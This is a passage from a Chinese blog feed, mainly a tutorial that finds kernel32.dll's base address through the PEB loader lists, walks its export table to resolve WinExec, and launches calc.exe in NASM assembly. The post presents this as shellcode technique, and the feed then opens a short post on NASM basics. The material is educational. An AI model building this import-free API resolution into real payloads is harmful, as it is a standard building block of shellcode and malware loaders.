LastErrorValue; ULONG CountOfOwnedCriticalSections; PVOID CsrClientThread; PVOID Win32ThreadInfo; ULONG Win32ClientInfo[0x1F]; PVOID WOW32Reserved; ULONG CurrentLocale; ULONG FpSoftwareStatusRegister; PVOID SystemReserved1[0x36]; PVOID Spare1; ULONG ExceptionCode; ULONG SpareBytes1[0x28]; PVOID SystemReserved2[0xA]; ULONG GdiRgn; ULONG GdiPen; ULONG GdiBrush; CLIENT_ID RealClientId; PVOID GdiCachedProcessHandle; ULONG GdiClientPID; ULONG GdiClientTID; PVOID GdiThreadLocaleInfo; PVOID UserReserved[5]; PVOID GlDispatchTable[0x118]; ULONG GlReserved1[0x1A]; PVOID GlReserved2; PVOID GlSectionInfo; PVOID GlSection; PVOID GlTable; PVOID GlCurrentRC; PVOID GlContext; NTSTATUS LastStatusValue; UNICODE_STRING StaticUnicodeString; WCHAR StaticUnicodeBuffer[0x105]; PVOID DeallocationStack; PVOID TlsSlots[0x40]; LIST_ENTRY TlsLinks; PVOID Vdm; PVOID ReservedForNtRpc; PVOID DbgSsReserved[0x2]; ULONG HardErrorDisabled; PVOID Instrumentation[0x10]; PVOID WinSockData; ULONG GdiBatchCount; ULONG Spare2; ULONG Spare3; ULONG Spare4; PVOID ReservedForOle; ULONG WaitingOnLoaderLock; PVOID StackCommit; PVOID StackCommitMax; PVOID StackReserved; } TEB, *PTEB;   不过依然没什么卵用，因为在乎的只有 PPEB 这个字段。好吧，点到为止。\n在那篇文章的原文里，给出的找到 kernel32.dll 的查找路径是这样的：TEB-\u0026gt;PEB-\u0026gt;Ldr-\u0026gt;InMemoryOrderLoadList-\u0026gt;currentProgram-\u0026gt;ntdll-\u0026gt;kernel32.BaseDll\n1.1 Process Environment Block 从 TEB 出发，找到 PEB (12*sizeof PVOID)==48==0x30 。PEB 的结构如下，文档参考这个。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56  typedef struct _PEB { BOOLEAN InheritedAddressSpace; BOOLEAN ReadImageFileExecOptions; BOOLEAN BeingDebugged; BOOLEAN Spare; HANDLE Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA LoaderData; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; PVOID SubSystemData; PVOID ProcessHeap; PVOID FastPebLock; PPEBLOCKROUTINE FastPebLockRoutine; PPEBLOCKROUTINE FastPebUnlockRoutine; ULONG EnvironmentUpdateCount; PPVOID KernelCallbackTable; PVOID EventLogSection; PVOID EventLog; PPEB_FREE_BLOCK FreeList; ULONG TlsExpansionCounter; PVOID TlsBitmap; ULONG TlsBitmapBits[0x2]; PVOID ReadOnlySharedMemoryBase; PVOID ReadOnlySharedMemoryHeap; PPVOID ReadOnlyStaticServerData; PVOID AnsiCodePageData; PVOID OemCodePageData; PVOID UnicodeCaseTableData; ULONG NumberOfProcessors; ULONG NtGlobalFlag; BYTE Spare2[0x4]; LARGE_INTEGER CriticalSectionTimeout; ULONG HeapSegmentReserve; ULONG HeapSegmentCommit; ULONG HeapDeCommitTotalFreeThreshold; ULONG HeapDeCommitFreeBlockThreshold; ULONG NumberOfHeaps; ULONG MaximumNumberOfHeaps; PPVOID *ProcessHeaps; PVOID GdiSharedHandleTable; PVOID ProcessStarterHelper; PVOID GdiDCAttributeList; PVOID LoaderLock; ULONG OSMajorVersion; ULONG OSMinorVersion; ULONG OSBuildNumber; ULONG OSPlatformId; ULONG ImageSubSystem; ULONG ImageSubSystemMajorVersion; ULONG ImageSubSystemMinorVersion; ULONG GdiHandleBuffer[0x22]; ULONG PostProcessInitRoutine; ULONG TlsExpansionBitmap; BYTE TlsExpansionBitmapBits[0x80]; ULONG SessionId; } PEB, *PPEB;   接着从 PEB 找到 Ldr，位置是 (sizeof(BOOLEAN)*4+sizeof(HANDLE)+sizeof(PVOID))==12==0xc。\n1.2 PEB_LDR_DATA 接着从 PEB_LDR_DATA 结构里找 InMemoryOrderModuleList 这个字段，PEB_LDR_DATA 结构如下。\n1 2 3 4 5 6 7 8  typedef struct _PEB_LDR_DATA { ULONG Length; BOOLEAN Initialized; PVOID SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA;   找到InMemoryOrderModuleList字段，位置是(sizeof(ULONG)+sizeof(BOOLEAN)+sizeof(PVOID)+sizeof(LIST_ENTRY))==20==0x14\n注意 sizeof(BOOLEAN) 是 BYTE 类型，但这个结构体是被对齐到了4字节的，所以 BOOLEAN 字段后面实际有3个字节的 padding。合起来就是三个 DWORD 。\n1.3 LDR_DATA_TABLE_ENTRY 之后就是 LIST_ENTRY 这个结构了，用 WinDbg 查了下结构：\n1 2 3 4  0:000\u0026gt; dt _LIST_ENTRY ntdll!_LIST_ENTRY +0x000 Flink : Ptr32 _LIST_ENTRY +0x004 Blink : Ptr32 _LIST_ENTRY   根据上面 Undocumented 文档和原文章的叙述来看，这应该就是个指向 _LDR_DATA_TABLE_ENTRY 结构（双向链表）的指针。_LIST_ENTRY结构本身是包含两个指针，一个Forward正向指针，一个Backward。所以我们取Flink字段就可以，跳过InLoadOrderModuleList这个字段后，一共偏移 0x14 就是我们要的 Flink 指针了，指向的应该是 _LDR_DATA_TABLE_ENTRY 这个结构体中的 InMemoryOrderLinks 字段。下面给出_LDR_DATA_TABLE_ENTRY的结构（WinDbg）。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61  0:000\u0026gt; dt _ldr_data_table_entry ntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY +0x008 InMemoryOrderLinks : _LIST_ENTRY +0x010 InInitializationOrderLinks : _LIST_ENTRY +0x018 DllBase : Ptr32 Void +0x01c EntryPoint : Ptr32 Void +0x020 SizeOfImage : Uint4B +0x024 FullDllName : _UNICODE_STRING +0x02c BaseDllName : _UNICODE_STRING +0x034 FlagGroup : [4] UChar +0x034 Flags : Uint4B +0x034 PackagedBinary : Pos 0, 1 Bit +0x034 MarkedForRemoval : Pos 1, 1 Bit +0x034 ImageDll : Pos 2, 1 Bit +0x034 LoadNotificationsSent : Pos 3, 1 Bit +0x034 TelemetryEntryProcessed : Pos 4, 1 Bit +0x034 ProcessStaticImport : Pos 5, 1 Bit +0x034 InLegacyLists : Pos 6, 1 Bit +0x034 InIndexes : Pos 7, 1 Bit +0x034 ShimDll : Pos 8, 1 Bit +0x034 InExceptionTable : Pos 9, 1 Bit +0x034 ReservedFlags1 : Pos 10, 2 Bits +0x034 LoadInProgress : Pos 12, 1 Bit +0x034 LoadConfigProcessed : Pos 13, 1 Bit +0x034 EntryProcessed : Pos 14, 1 Bit +0x034 ProtectDelayLoad : Pos 15, 1 Bit +0x034 ReservedFlags3 : Pos 16, 2 Bits +0x034 DontCallForThreads : Pos 18, 1 Bit +0x034 ProcessAttachCalled : Pos 19, 1 Bit +0x034 ProcessAttachFailed : Pos 20, 1 Bit +0x034 CorDeferredValidate : Pos 21, 1 Bit +0x034 CorImage : Pos 22, 1 Bit +0x034 DontRelocate : Pos 23, 1 Bit +0x034 CorILOnly : Pos 24, 1 Bit +0x034 ChpeImage : Pos 25, 1 Bit +0x034 ReservedFlags5 : Pos 26, 2 Bits +0x034 Redirected : Pos 28, 1 Bit +0x034 ReservedFlags6 : Pos 29, 2 Bits +0x034 CompatDatabaseProcessed : Pos 31, 1 Bit +0x038 ObsoleteLoadCount : Uint2B +0x03a TlsIndex : Uint2B +0x03c HashLinks : _LIST_ENTRY +0x044 TimeDateStamp : Uint4B +0x048 EntryPointActivationContext : Ptr32 _ACTIVATION_CONTEXT +0x04c Lock : Ptr32 Void +0x050 DdagNode : Ptr32 _LDR_DDAG_NODE +0x054 NodeModuleLink : _LIST_ENTRY +0x05c LoadContext : Ptr32 _LDRP_LOAD_CONTEXT +0x060 ParentDllBase : Ptr32 Void +0x064 SwitchBackContext : Ptr32 Void +0x068 BaseAddressIndexNode : _RTL_BALANCED_NODE +0x074 MappingInfoIndexNode : _RTL_BALANCED_NODE +0x080 OriginalBase : Uint4B +0x088 LoadTime : _LARGE_INTEGER +0x090 BaseNameHashValue : Uint4B +0x094 LoadReason : _LDR_DLL_LOAD_REASON +0x098 ImplicitPathOptions : Uint4B +0x09c ReferenceCount : Uint4B +0x0a0 DependentLoadFlags : Uint4B +0x0a4 SigningLevel : UChar   要注意到 _LDR_DATA_TABLE_ENTRY 结构中的 InMemoryOrderLinks 并不是在结构开头，所以取得的地址必须先减去这个偏移值（8字节）再转换类型才是正确的结构。\n1.4 模块基址 接着从 WinDbg 可以实际发现，这个链表里，我们的程序之后就是ntdll.dll，再之后就是kernel32.dll，不再演示。反正就当kernel32.dll固定在这个链表的第三个元素就是了。真要高鲁棒性的话就得遍历这个链表，按名字找出 kernel32.dll 对应的结构，再取地址——麻烦死了。\n取得 kernel32.dll 对应的 _LDR_DATA_TABLE_ENTRY 结构后，就可以提取其中的 DllBase 字段了，这个字段就是 kernel32.dll 的基址。\n1.5 TEB 的位置 谷歌一下不难找到，Win32程序进程地址空间里，TEB的地址就在 [fs:0] 这个地址上。\n1.6 获取 kernel 32 基址 那就开始写汇编。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  section .text global _main _main: push ebp mov ebp,esp ; 获取 kernel32.dll 基址  mov eax, [fs:30h] ; eax = TEB-\u0026gt;PEB  mov eax, [eax+0ch] ; eax = PEB-\u0026gt;Ldr  mov eax, [eax+14h] ; eax = PEB_LDR_DATA-\u0026gt;InMemoryOrderModuleList.Flink (当前程序)  mov eax, [eax] ; eax = \u0026amp;_LDR_DATA_TABLE_ENTRY.InMemoryOrderModuleList.Flink (现在是 ntdll.dll)  mov eax, [eax] ; eax = \u0026amp;_LDR_DATA_TABLE_ENTRY.InMemoryOrderModuleList.Flink (现在是 kernel32.dll)  mov eax, [eax-8h+18h] ; eax = \u0026amp;_LDR_DATA_TABLE_ENTRY.DllBase (kernel32.dll 基址)  xor eax,eax pop ebp retn   用 MinGW 编译。\n1 2  nasm main.asm -f win32 -o main.o gcc main.o -nostartfiles -nodefaultlibs -o main.exe   第一步 [fs:30h] 这个地址就是 TEB 中的 PEB 指针，将指针保存的地址移入 eax 寄存器。现在 eax 寄存器指向的就是 PEB 结构了。\n第二步取 PEB-\u0026gt;Ldr 指针。\n第三步取 PEB_LDR_DATA-\u0026gt;InMemoryOrderModuleList.Flink 指针，这个指针指向的是当前程序的 _LDR_DATA_TABLE_ENTRY.InMemoryOrderModuleList.Flink 。此时我们已经开始遍历链表。\n第四步是取链表的下一个元素，我们认为是 ntdll.dll ，再取下一个元素，得到 kernel32.dll。\n此时的 eax 指向的还是 _LDR_DATA_TABLE_ENTRY.InMemoryOrderModuleList.Flink 请注意，计算偏移的时候要先移回结构的首部（-0x08）再计算。\n第五步就是从 kernel32.dll 的 _LDR_DATA_TABLE_ENTRY 结构里，取 DllBase 字段的值了。eax - 8h + 18h 得到 DllBase 字段的偏移地址，执行后得到的就是 kernel32.dll 的基址指针了。\n我们可以用 WinDbg Preview 验证下。\n\u0026hellip;.\n不知道为啥 WinDbg Preview 不能正确调试，还是用回 x32dbg 。\n注意此时 EAX 的值是 75B30000 ，内容被调试器识别为 MZ? ，显然是个 DOS 文件头。\n在调试器的内存布局窗口可以看到，这个地址正好就是 kernel32.dll 的镜像基址。\n到此，我们已经找到了 kernel32.dll 的镜像基址，找到了镜像基址后，根据之前学习的对 PE 文件格式的了解，就有机会自己解析导出表，调用 kernel32.dll 内的函数啦。\n0x02 寻找 WinExec 函数 作为实践的目标，这次希望在 kernel32.dll 里找出 WinExec 函数。这个函数的文档在这里。函数签名如下。\n1 2 3 4  UINT WinExec( [in] LPCSTR lpCmdLine, [in] UINT uCmdShow );   文档说我们应该用 CreateProcess 但是那个函数参数多的一批，狗都不看。微软就没点13数么。\n2.1 寻找导出表 有了 kernel32.dll 的基址，下一步就是寻找导出表的位置了。\n依据我们对 PE 文件格式的了解，首先得在 Data Directories 里找到 Export Directory 。\n在此之前，我们先暂存一下 kernel32.dll 基址以备后用。\n1  mov ebx, eax   然后开始寻找 dos 文件头里的 lfanew 。相对文件头的偏移是 3ch ，内容是相对文件头的偏移值，我们这样计算。\n1 2  mov eax, [ebx+3ch] add eax, ebx   现在 eax 指向的就是 pe 文件头了。\n然后我们找到 ExportDirectory.VirtualAddress 的偏移，它在相对 PE 文件头 78h 偏移的地方。如果还记得 16 个元素的 Data Directories 结构的话，提醒下 ExportDirectory 就是所有 Data Directories 里排第一个的结构。\n1  mov eax, [eax+78h] ; eax = ExportDirectory.VirtualAddress   得到的是 RVA ，加上基址。\n1  add eax, ebx ; eax = \u0026amp;ExportDirectoryTable   接下来要开始解析 ExportDirectoryTable 结构了，参考微软的文档。\n因为需要暂存很多变量，我们先给这些变量在栈上分配空间。\n2.2 分配栈变量 先回到开头，定义好栈如何分配。\n1 2 3 4 5 6 7  %define kernel32_base 0x04 %define numberof_export_entries 0x08 %define address_of_ordinal_table 0x0c %define address_of_func_address_table 0x10 %define address_of_export_directory_table 0x14 %define address_of_name_table 0x18 %define ordinal_base 0x1c   然后在入口点处，添加 sub esp, 0x1c，分配栈空间。之后就可以使用 [ebp-变量] 的形式来使用这些变量了。修改后的代码如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  %define kernel32_base 0x04 %define numberof_export_entries 0x08 %define address_of_ordinal_table 0x0c %define address_of_func_address_table 0x10 %define address_of_export_directory_table 0x14 %define address_of_name_table 0x18 %define ordinal_base 0x1c section .text global _main _main: push ebp mov ebp, esp sub esp, 1ch ; 获取 kernel32.dll 基址  mov eax, [fs:30h] ; eax = TEB-\u0026gt;PEB  mov eax, [eax+0ch] ; eax = PEB-\u0026gt;Ldr  mov eax, [eax+14h] ; eax = PEB_LDR_DATA-\u0026gt;InMemoryOrderModuleList.Flink (当前程序)  mov eax, [eax] ; eax = \u0026amp;_LDR_DATA_TABLE_ENTRY.InMemoryOrderModuleList.Flink (现在是 ntdll.dll)  mov eax, [eax] ; eax = \u0026amp;_LDR_DATA_TABLE_ENTRY.InMemoryOrderModuleList.Flink (现在是 kernel32.dll)  mov eax, [eax-8h+18h] ; eax = \u0026amp;_LDR_DATA_TABLE_ENTRY.DllBase (kernel32.dll 基址)  mov ebx, eax ; ebx -\u0026gt; kernel32.dll 基址  mov [ebp-kernel32_base], eax ; kernel32_base -\u0026gt; kernel32.dll 基址  mov eax, [ebx+3ch] add eax, ebx ; eax -\u0026gt; kernel32.dll 的 pe 文件头  mov eax, [eax+78h] ; eax -\u0026gt; ExportDirectory.VirtualAddress  add eax, ebx ; eax -\u0026gt; Export Directory Table  xor eax, eax add esp, 1ch pop ebp retn   接着从 xor eax,eax 之前继续。\n2.3 分析 Export Directory Table 先给出定义。\n   Offset Size Field Description     0 4 Export Flags Reserved, must be 0.   4 4 Time/Date Stamp The time and date that the export data was created.   8 2 Major Version The major version number. The major and minor version numbers can be set by the user.   10 2 Minor Version The minor version number.   12 4 Name RVA The address of the ASCII string that contains the name of the DLL. This address is relative to the image base.   16 4 Ordinal Base The starting ordinal number for exports in this image. This field specifies the starting ordinal number for the export address table. It is usually set to 1.   20 4 Address Table Entries The number of entries in the export address table.   24 4 Number of Name Pointers The number of entries in the name pointer table. This is also the number of entries in the ordinal table.   28 4 Export Address Table RVA The address of the export address table, relative to the image base.   32 4 Name Pointer RVA The address of the export name pointer table, relative to the image base. The table size is given by the Number of Name Pointers field.   36 4 Ordinal Table RVA The address of the ordinal table, relative to the image base.    注意 offset 是 10 进制，之后编写的代码里会用 16 进制。\n我们把这个结构里，我们关注的字段保存到栈上。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  mov ecx, eax ; 暂存导出表结构基址用来运算  mov [ebp-address_of_export_directory_table], eax ; 保存导出表结构基址到栈变量  mov eax, [eax+1ch] add eax, ebx mov [ebp-address_of_func_address_table], eax ; 保存导出函数表地址到栈变量  mov eax, ecx mov eax, [eax+24h] add eax, ebx mov [ebp-address_of_ordinal_table], eax ; 保存ordinal表地址到栈变量  mov eax, ecx mov eax, [eax+18h] mov [ebp-numberof_export_entries], eax ; 保存导出表(name)数量到栈变量  mov eax, ecx mov eax, [eax+20h] ; eax=第一个函数名称的 RVA  mov [ebp-address_of_name_table], eax ; 保存导出函数的名称表到栈变量  mov eax, ecx mov eax, [eax+10h] mov [ebp-ordinal_base], eax ; 保存 ordinal base 用于计算导出函数的地址   应该不难理解。\n接下来要从这个结构里找出 WinExec 函数的地址。\n2.4 导出表和函数地址 一些前置知识。\n导出函数的地址表是用 Ordinal 做索引的，所以必须先取得 Ordinal 才能正确取得地址。\n The export address table contains the address of exported entry points and exported data and absolutes. An ordinal number is used as an index into the export address table.\n 注意从 Ordinal Base 取出的值是 unbiased indexes，从 Ordinal Table 里取出的 Ordinal 值并不需要减去 Ordinal Base 。但是 DUMPBIN 之类的工具似乎会给出加上了 Ordinal Base 的 Ordinal 值，也就是微软文档中说的 Biased Ordinal 。\n这份文档曾经是错误的，见爆栈的这个问题。要是看了什么不知道从哪儿复制粘贴来的博客可能会有误解，但现在的文档里是明确说了是 unbiased indexes 。取得 Ordinal 之后直接当下标去访问就行了。\n The export ordinal table is an array of 16-bit unbiased indexes into the export address table. Ordinals are biased by the Ordinal Base field of the export directory table. In other words, the ordinal base must be subtracted from the ordinals to obtain true indexes into the export address table.\n 文档也明确指出，你可以把名称表和ordinal表当成一个表，下标是共通的。也就是名称表的第1个元素对应ordinal表的第一个元素，以此类推。\n The export name pointer table and the export ordinal table form two parallel arrays that are separated to allow natural field alignment. These two tables, in effect, operate as one table, in which the Export Name Pointer column points to a public (exported) name and the Export Ordinal column gives the corresponding ordinal for that public name. A member of the export name pointer table and a member of the export ordinal table are associated by having the same position (index) in their respective arrays.\n 现在我们可以开始处理这几个表了。\n2.5 遍历名称表 字符串常量要记得先定义好，之后用。\n1 2 3 4 5  section .data str_winexec: db \u0026#39;WinExec\u0026#39;, 0 str_calcexe: db \u0026#39;calc.exe\u0026#39;, 0   首先从名称表里找出 WinExec 这个字符串。之后会拿 eax 保存下标，ecx 用于 repe cmpsb 指令，所以这两个字段我们先清空。\n1 2  xor eax, eax xor ecx, ecx   接着写一个循环。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  .findWinExecLocation: mov esi, str_winexec ; 准备比较，esi=常量字符串  mov edi, [ebp-address_of_name_table] ; 准备比较，edi=名称表首元素，注意名称表是一个指针数组，每个元素都是 DWORD RVA  cld ; 清除 df 标志位  mov ecx, eax ; 暂存下 eax，接下来 eax 要算下标  shl eax, 2h ; 左移 2 位，等于 eax *= 4  add edi, eax ; 啰嗦这么多就是为了 edi = edi + eax * 4  mov eax, ecx ; 恢复 eax 的值  mov edi, [ebx + edi] ; edi = *(基址+名称表RVA[下标])，注意此时拿到的还是一个 RVA ，指向导出函数名字符串  add edi, ebx ; 将 RVA 加上基址，得到完整的地址  mov cx, 8 ; repe cmpsb 使用 cx 寄存器来计数，WinExec 长度是 7，加上 NUL 就是 8 个字符  repe cmpsb ; 字符串比较  jz .found ; 如果 repe cmpsb 得到的结果是相同，那么当前下标 eax 就是 WinExec 了，跳转出循环  inc eax ; 否则下标自增  cmp eax, [ebp-numberof_export_entries] ; 如果当前下标还不等于导出总数  jne .findWinExecLocation ; 继续循环  .found:   最复杂的部分就是算偏移，在 C 中一个下标运算又或者指针解引用的事情在汇编里就很蛋疼。\n2.6 取 Ordinal 和函数地址 得到正确下标后就可以取 Ordinal 了。先把 ordinal 表的地址和 函数地址表的地址放进寄存器。\n1 2  mov ecx, [ebp-address_of_ordinal_table] mov edx, [ebp-address_of_func_address_table]   然后用 eax 做下标，取 ordinal 值。\n1  mov ax, [ecx+eax*2] ; ax(ordinal) = ((WORD*)ordinal_table)[eax]   再拿 Ordinal 值做下标，取函数地址。\n1  mov eax,[edx+eax*4] ; eax = ((DWORD*)address_table)[eax]   最后把函数地址（RVA）加上基址。\n1  add eax, ebx ; eax=WinExec 函数的地址   得到 WinExec 函数在内存中的地址。\n2.7 调用 WinExec 函数 Windows API 都是 stdcall 调用约定，我们不用管清栈，直接压参数就好。\n1 2 3  push 10 ; SW_SHOWDEFAULT  push str_calcexe ; 字符串 calc.exe  call eax ; __stdcall WinExec   到这里，应该就成功调用了 WinExec 函数了。\n2.8 清理和退出 写完了主要功能，接下来就要给自己擦屁股了，平栈。\n1 2 3 4  add esp, 1ch pop ebp xor eax, eax retn   收工！\n2.9 完整代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95  %define kernel32_base 0x04 %define numberof_export_entries 0x08 %define address_of_ordinal_table 0x0c %define address_of_func_address_table 0x10 %define address_of_export_directory_table 0x14 %define address_of_name_table 0x18 %define ordinal_base 0x1c section .text global _main _main: push ebp mov ebp, esp sub esp, 1ch ; 获取 kernel32.dll 基址  mov eax, [fs:30h] ; eax = TEB-\u0026gt;PEB  mov eax, [eax+0ch] ; eax = PEB-\u0026gt;Ldr  mov eax, [eax+14h] ; eax = PEB_LDR_DATA-\u0026gt;InMemoryOrderModuleList.Flink (当前程序)  mov eax, [eax] ; eax = \u0026amp;_LDR_DATA_TABLE_ENTRY.InMemoryOrderModuleList.Flink (现在是 ntdll.dll)  mov eax, [eax] ; eax = \u0026amp;_LDR_DATA_TABLE_ENTRY.InMemoryOrderModuleList.Flink (现在是 kernel32.dll)  mov eax, [eax-8h+18h] ; eax = \u0026amp;_LDR_DATA_TABLE_ENTRY.DllBase (kernel32.dll 基址)  mov ebx, eax ; ebx -\u0026gt; kernel32.dll 基址  mov [ebp-kernel32_base], eax ; kernel32_base -\u0026gt; kernel32.dll 基址  mov eax, [ebx+3ch] add eax, ebx ; eax -\u0026gt; kernel32.dll 的 pe 文件头  mov eax, [eax+78h] ; eax -\u0026gt; ExportDirectory.VirtualAddress  add eax, ebx ; eax -\u0026gt; Export Directory Table  mov ecx, eax ; 暂存导出表结构基址用来运算  mov [ebp-address_of_export_directory_table], eax ; 保存导出表结构基址到栈变量  mov eax, [eax+1ch] add eax, ebx mov [ebp-address_of_func_address_table], eax ; 保存导出函数表地址到栈变量  mov eax, ecx mov eax, [eax+24h] add eax, ebx mov [ebp-address_of_ordinal_table], eax ; 保存ordinal表地址到栈变量  mov eax, ecx mov eax, [eax+18h] mov [ebp-numberof_export_entries], eax ; 保存导出表(name)数量到栈变量  mov eax, ecx mov eax, [eax+20h] ; eax=第一个函数名称的 RVA  mov [ebp-address_of_name_table], eax ; 保存导出函数的名称表到栈变量  mov eax, ecx mov eax, [eax+10h] mov [ebp-ordinal_base], eax ; 保存 ordinal base 用于计算导出函数的地址  xor eax,eax xor ecx,ecx .findWinExecLocation: mov esi, str_winexec ; 准备比较，esi=常量字符串  mov edi, [ebp-address_of_name_table] ; 准备比较，edi=名称表首元素  cld ; 清除 df 标志位  mov ecx, eax ; 暂存下 eax，接下来 eax 要算下标  shl eax, 2h ; 左移 2 位，等于 eax *= 4  add edi, eax ; 啰嗦这么多就是为了 edi = edi + eax * 4  mov eax, ecx ; 恢复 eax 的值  mov edi, [ebx + edi] ; edi = *(基址+名称表RVA[下标])，注意此时拿到的还是一个 RVA ，指向导出函数名字符串  add edi, ebx ; 将 RVA 加上基址，得到完整的地址  mov cx, 8 ; repe cmpsb 使用 cx 寄存器来计数，WinExec 长度是 7，加上 NUL 就是 8 个字符  repe cmpsb ; 字符串比较  jz .found ; 如果 repe cmpsb 得到的结果是相同，那么当前下标 eax 就是 WinExec 了，跳转出循环  inc eax ; 否则下标自增  cmp eax, [ebp-numberof_export_entries] ; 如果当前下标还不等于导出总数  jne .findWinExecLocation ; 继续循环  .found: mov ecx, [ebp-address_of_ordinal_table] mov edx, [ebp-address_of_func_address_table] mov ax, [ecx+eax*2] ; ax(ordinal) = ((WORD*)ordinal_table)[eax]  mov eax,[edx+eax*4] ; eax = ((DWORD*)address_table)[eax]  add eax, ebx ; eax=WinExec 函数的地址  push 10 ; SW_SHOWDEFAULT  push str_calcexe ; 字符串 calc.exe  call eax ; __stdcall WinExec  add esp, 1ch pop ebp xor eax, eax retn section .data str_winexec: db \u0026#39;WinExec\u0026#39;, 0 str_calcexe: db \u0026#39;calc.exe\u0026#39;, 0   0x03 验证 验证方法很简单，我们编译之，运行，然后就好啦！\nWinExec 的返回值在 eax 里，微软的文档说返回值大于 31 就是 OJBK，0x21 是10进制的33，所以完全 OJBK 。\n总结 这是写 shellcode 的技术吧，东一榔头西一棒子就是我了。话说 shellcode 的具体定义是啥来着？我只剩菜了.jpg\n最终体会就是写过汇编才知道 C 真的是很高级的语言了（\n真要算地址算偏移一算一整天，365天对着16进制数做加减乘除那真就是折磨。\nWindows 未公开的数据结构也不知道网上的大佬都是怎么研究出来的，毕竟理论上来说搞这个没有任何价值，在逆向研究出结果之前谁也不知道这些东西能带来什么价值，甚至你搞完了也不知道有什么价值，直到有一天被正好有需要的人发现（大黑阔：现成的洞，好耶）。\n嗯，这个想法就让人比较兴奋，顿时感觉自己闲出屁摸鱼也是在为社会创造价值了呢~\n另外关于如何用 C 写 shellcode，其实我想了下，也许可以让编译器把汇编吐出来，然后从里面拿咱需要的代码？不过这也不知道怎么编译器吐出能让 nasm 接受的汇编。或者有啥比较业界通行的语法标准？只知道有 AT\u0026amp;T 和 Intel 两种风格，但非要说的话 nasm 和 masm 都有些不兼容，尽管都是 Intel 风格（大概）。或者就是让编译器吐个 obj 文件出来，然后解析这个 obj ，提取里面的二进制代码就好。\n好了瞎bb完毕。收工啦。\n","date":"2021-10-14T16:31:00+08:00","permalink":"https://nnnewb.github.io/blog/p/find-kernel32-in-memory/","title":"关于在内存里找kernel32这件事"},{"content":"前言 主要是虽然有个汇编器 nasm 但是不知道怎么用，啥汇编都是调试器里纸上谈兵。最近碰到个问题，MinGW 可以用参数 -Wl,section-start= 来修改 section 地址，但 msvc 没有对应物，就蛋疼。手动改 PE 来添加 section 好像可行，但不知道该怎么做，lief 也不熟悉。\n正好瞎谷歌的时候发现 nasm 可以直接编译出 PE 文件，这就听起来很有意思了。汇编嘛，听着就很底层，很自由，改个 Section 地址不是手到擒来。于是就学学看。\n参考文章附于文末。\n0x01 nasm 基本用法 1.1 label 汇编当然有经典的 label 和 instruction 了，instruction 的参数就叫 operand 。\nnasm 的 label 语法很简单，任何不是宏和 instruction 或者伪指令的东西，出现在行首，都会被认作 label。\n1 2 3 4 5 6 7 8  lbl1: ; 这是label \tsub esp, 4h jmp lbl lbl2 ; 这也是 label \tsub esp, 4h lbl3 db 1 ; 这还是 label .label4 ; 这是本地 label，可以用 .label4 或者全称 lbl3.label4 访问 .@label5 ; 这是特殊 label ，只能在宏里使用，避免干扰本地label   label 可以被视作一个数字参与运算，比如说 lbl3-lbl2 这样算出偏移。或者还可以参数伪指令计算。总之用处很多。\n1.2 伪指令 伪指令是一些并不是真正的 x86 机器指令，但还是被用在了 instruction 域中的指 令，因为使用它们可以带来很大的方便。当前的伪指令有DB,DW,DD,DQ和 DT，它们对应的未初始化指令是 RESB, RESW, RESD, RESQ 和 REST，INCBIN 命令，EQU 命令和 TIEMS 前缀。\n不复制粘贴了，看文档好吧。\n1.2 有效地址 有效地址是指令的操作数，是对内存的引用。nasm中有效地址的语法非常简单：由一个可计算表达式组成，放在中括号内。\n1 2 3 4 5  wordvar: dw 123 mov ax, [wordvar] ; [wordvar] 就是取 dw 123 的首地址 \tmov ax, [wordvar+1] ; wordvar+1 label 参与算术运算，取 dw 123 地址 + 1字节 \tmov ax, [es:wordvar+bx] ; 加上段选择子，寄存器参与运算   与上例不一致的表达式都不是 nasm 的有效地址，比如 es:wordvar[bx] 。\n还可以用 BYTE WORD DWORD NOSPLIT 等关键字强迫 nasm 产生特定形式的有效地址。比如 [dword eax+3] 。\n详细还是看文档。\n1.3 常数 支持的常数类型包括：\n  数值\n 100 10进制 100h 16进制，h结尾 0x100 16进制，0x开头 $0100 16进制，$0开头 777q 8进制，q结尾 10010011b 2进制，b结尾    字符\n abcd 字符型常数，小端序    字符串\n 一般只有伪指令接受，形式如 db 'abcd' 、db 'a','b','c','d' 。    浮点数\n 反正用不到我也懒得看。    1.4 表达式 和C的差不多，除了+-*/%和位运算，多了个 // 表示带符号除法，%% 表示带符号取模。\n1.5 预处理器 预处理器指令以 % 开头。举几个例子\n1 2 3 4  %define FOO BAR %define FN(x) (x+1) %include \u0026#34;xxx.asm\u0026#34; %undef FOO   其他懒得写了，先知道这几个和C类似的宏就行，更多看文档。\n1.6 汇编器指令 提几个会用到的。\nBITS，指定目标处理器模式，比如 BITS 32 就是32位模式。现在找16位的环境怕是也难。\nSECTION，改变正在编写的代码要汇编进的段。要是打算汇编成 obj 让链接器去链接出新文件会有点用。但是输出格式是 bin 的时候就没有卵用了。\nEXTERN，导入外部符号，还是汇编成 obj 让链接器用的时候会有点用，链接器会搞定链接，输出格式是 bin 